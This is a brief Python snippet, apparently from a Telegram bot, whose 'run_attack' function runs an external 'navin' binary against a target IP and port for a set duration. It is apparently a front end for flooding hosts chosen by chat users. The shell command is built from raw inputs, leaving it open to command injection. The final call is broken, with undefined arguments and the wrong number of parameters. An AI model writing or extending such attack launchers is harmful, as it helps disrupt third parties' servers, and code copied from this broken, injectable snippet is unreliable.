
import asyncio
import logging

async def run_attack(chat_id, ip, port, duration, context):
    """ Executes the navin binary asynchronously with logging """
    try:
        logging.info(f"Starting attack on {ip}:{port} for {duration}s")
        process = await asyncio.create_subprocess_shell(
            f"./navin {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"✅ *Output:*\n```\n{stdout.decode()}\n```")
        if stderr:
            await context.bot.send_message(chat_id=chat_id, text=f"⚠️ *Error:*\n```\n{stderr.decode()}\n```", parse_mode="Markdown")

    except Exception as e:
        print(f"❌ *Error:* {str(e)}")

asyncio.run(run_attack(ip, port, duration))
